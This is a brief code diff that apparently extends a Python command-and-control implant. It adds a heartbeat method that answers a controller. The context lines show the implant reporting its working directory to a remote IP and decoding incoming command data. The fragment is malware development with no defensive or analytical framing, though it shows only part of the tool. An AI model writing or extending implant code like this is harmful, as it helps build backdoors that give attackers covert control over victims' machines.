@@ -25,6 +25,10 @@ class Implant(Host):
     def join(self, shellpack):
         self.send(shellpack['ip'], "join", os.getcwd().encode())
 
+    def heartbeat_response(self, shellpack):
+        if shellpack['data'] == self.id:
+            self.send(self.controller_ip, "heartbeat", self.id)
+
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
